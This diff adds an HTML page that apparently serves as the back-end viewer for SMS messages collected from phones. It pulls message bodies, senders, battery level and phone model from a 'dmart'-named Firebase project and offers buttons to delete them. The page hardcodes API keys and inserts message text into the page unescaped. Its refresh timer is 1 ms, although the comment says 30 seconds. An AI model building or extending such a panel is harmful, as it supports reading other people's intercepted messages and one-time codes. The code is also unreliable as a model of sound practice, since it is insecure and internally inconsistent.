@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SMS Details</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            padding: 20px;
+        }
+        .button-container {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .back-button {
+            background-color: blue;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            padding: 10px 20px;
+            cursor: pointer;
+            margin-right: 10px;
+        }
+        .clear-all-button {
+            background-color: red;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            padding: 10px 20px;
+            cursor: pointer;
+        }
+        .sms-details {
+            border: 1px solid #ac0505;
+            padding: 15px;
+            border-radius: 5px;
+            background-color: #33e410;
+            margin-bottom: 10px;
+            position: relative;
+        }
+
+       
+        
+
+        h2 {
+            color: red;
+        }
+        .sms-container {
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+    <h2>SMS Details</h2>
+    
+    <!-- Button Container for Back and Clear All SMS -->
+    <div class="button-container">
+        <button class="back-button" id="backButton">Back</button>
+        <button class="clear-all-button" id="clearAllButton">Clear All SMS</button>
+    </div>
+
+    <div id="smsContainer"></div>
+
+    <script>
+        // Function for handling the Back button
+        document.getElementById('backButton').addEventListener('click', () => {
+            history.back(); // Navigates to the previous page
+        });
+
+        async function fetchSmsData() {
+            const selectedStudentKey = localStorage.getItem('selectedStudentKey');
+            if (!selectedStudentKey) {
+                console.error("No student key found in localStorage.");
+                return [];
+            }
+
+            const { initializeApp } = await import("https://www.gstatic.com/firebasejs/10.3.1/firebase-app.js");
+            const { getDatabase, ref, get } = await import("https://www.gstatic.com/firebasejs/10.3.1/firebase-database.js");
+
+        const firebaseConfig = {
+  apiKey: "AIzaSyDxlxSBiCEFf0PtWKoCSsA6BcpibN85x-Y",
+  authDomain: "dmart-website-6c48c.firebaseapp.com",
+  projectId: "dmart-website-6c48c",
+  storageBucket: "dmart-website-6c48c.firebasestorage.app",
+  messagingSenderId: "960037120520",
+  appId: "1:960037120520:web:952c932d345bca51d03fbd",
+  measurementId: "G-51BMQD6D13"
+};
+
+            const app = initializeApp(firebaseConfig);
+            const db = getDatabase(app);
+
+            const smsRef = ref(db, `packages/${selectedStudentKey}/sms`);
+            const snapshot = await get(smsRef);
+
+            if (snapshot.exists()) {
+                return Object.keys(snapshot.val()).map(smsKey => ({
+                    ...snapshot.val()[smsKey],
+                    key: smsKey
+                }));
+            } else {
+                console.log("No SMS data available.");
+                return [];
+            }
+        }
+
+        function displaySmsDetails(smsData) {
+            const smsContainer = document.getElementById('smsContainer');
+            smsContainer.innerHTML = "";
+
+            if (smsData.length === 0) {
+                smsContainer.innerHTML = "<p>No SMS data available.</p>";
+                return;
+            }
+
+            smsData.reverse().forEach((sms) => {
+                const smsDiv = document.createElement('div');
+                smsDiv.className = 'sms-details';
+
+                smsDiv.innerHTML = `
+                    <p><strong></strong> ${sms.messageBody || 'No message'}</p>
+                    <p><strong>Received Time:</strong> ${sms.receivedTime || 'No time'}</p>
+                    <p><strong>Sender:</strong> ${sms.sender || 'No sender'}</p>
+                     <p><strong>batteryPercentage:</strong> ${sms.batteryPercentage || 'No batteryPercentage'}</p>
+                        <p><strong>phoneModel:</strong> ${sms.phoneModel|| 'No phoneModel'}</p>
+                    
+                    <button class="delete-button" data-key="${sms.key}">Delete</button>
+                `;
+                smsContainer.appendChild(smsDiv);
+            });
+
+            document.querySelectorAll('.delete-button').forEach(button => {
+                button.addEventListener('click', async (event) => {
+                    const smsKey = event.target.getAttribute('data-key');
+                    console.log(`Deleting SMS with key: ${smsKey}`); // Debugging line
+                    await deleteSms(smsKey);
+                    await refreshSmsData();
+                });
+            });
+        }
+
+        async function deleteSms(smsKey) {
+            const selectedStudentKey = localStorage.getItem('selectedStudentKey');
+            if (!selectedStudentKey) {
+                console.error("No student key found in localStorage.");
+                return;
+            }
+
+            const { initializeApp } = await import("https://www.gstatic.com/firebasejs/10.3.1/firebase-app.js");
+            const { getDatabase, ref, remove } = await import("https://www.gstatic.com/firebasejs/10.3.1/firebase-database.js");
+
+            const firebaseConfig = {
+        apiKey: "AIzaSyAJFety7QKhETnF4z3kZiDYe74SL_UxWLQ",
+        authDomain: "dmart-16-11-24.firebaseapp.com",
+        projectId: "dmart-16-11-24",
+        databaseURL: "https://dmart-16-11-24-default-rtdb.firebaseio.com",
+        storageBucket: "dmart-16-11-24.appspot.com",
+        messagingSenderId: "364189454135",
+        appId: "1:364189454135:android:abb7f18d1b7caaa5abd4b2"
+    };
+
+            const app = initializeApp(firebaseConfig);
+            const db = getDatabase(app);
+
+            const smsRef = ref(db, `packages/${selectedStudentKey}/sms/${smsKey}`);
+            await remove(smsRef);
+            console.log("SMS data deleted successfully.");
+        }
+
+
+
+
+        async function deleteAllSms() {
+    const selectedStudentKey = localStorage.getItem('selectedStudentKey');
+    if (!selectedStudentKey) {
+        console.error("No student key found in localStorage.");
+        return;
+    }
+
+    const { initializeApp } = await import("https://www.gstatic.com/firebasejs/10.3.1/firebase-app.js");
+    const { getDatabase, ref, remove, get } = await import("https://www.gstatic.com/firebasejs/10.3.1/firebase-database.js");
+
+    const firebaseConfig = {
+        apiKey: "AIzaSyAJFety7QKhETnF4z3kZiDYe74SL_UxWLQ",
+        authDomain: "dmart-16-11-24.firebaseapp.com",
+        projectId: "dmart-16-11-24",
+        databaseURL: "https://dmart-16-11-24-default-rtdb.firebaseio.com",
+        storageBucket: "dmart-16-11-24.appspot.com",
+        messagingSenderId: "364189454135",
+        appId: "1:364189454135:android:abb7f18d1b7caaa5abd4b2"
+    };
+            
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    const smsRef = ref(db, `packages/${selectedStudentKey}/sms`);
+    const snapshot = await get(smsRef);
+
+    if (snapshot.exists()) {
+        const smsData = snapshot.val();
+        const deletePromises = Object.keys(smsData).map(smsKey => remove(ref(db, `packages/${selectedStudentKey}/sms/${smsKey}`)));
+        await Promise.all(deletePromises);
+        console.log("All SMS data deleted successfully.");
+    } else {
+        console.log("No SMS data to delete.");
+    }
+}
+
+        async function refreshSmsData() {
+            const smsData = await fetchSmsData();
+            displaySmsDetails(smsData);
+        }
+
+        document.addEventListener('DOMContentLoaded', async () => {
+            await refreshSmsData();
+            
+            document.getElementById('clearAllButton').addEventListener('click', async () => {
+                await deleteAllSms();
+                await refreshSmsData();
+            });
+
+            setInterval(refreshSmsData, 1); // Refresh every 30 seconds
+        });
+
+    </script>
+</body>
+</html>
